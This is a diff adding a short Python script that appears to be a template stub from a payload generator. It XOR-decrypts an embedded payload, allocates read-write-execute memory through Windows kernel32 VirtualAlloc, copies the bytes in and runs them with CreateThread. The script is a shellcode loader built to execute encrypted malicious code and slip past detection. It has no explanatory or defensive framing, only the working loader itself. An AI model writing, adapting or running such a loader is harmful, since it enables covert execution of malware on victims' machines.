@@ -1,0 +1,21 @@
+import ctypes
+import base64
+from itertools import cycle
+
+kernel32 = ctypes.windll.kernel32
+
+def main(crypted_data, key):
+    #data = base64.b64decode(data_b64)
+
+    encoded = ''.join(chr(ord(c)^ord(k)) for c,k in zip(crypted_data, cycle(key)))
+
+    MEM_COMMIT = 0x1000
+    PAGE_EXECUTE_READWRITE = 0x40
+
+    code_addr = kernel32.VirtualAlloc(0, len(encoded), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
+    ctypes.memmove(code_addr, encoded, len(encoded))
+
+    thread_handle = kernel32.CreateThread(0, 0, code_addr, 0, 0, ctypes.byref(ctypes.c_ulong()))
+    kernel32.WaitForSingleObject(thread_handle, 0xFFFFFFFF)
+
+main('''{data}''','''{secret}''')
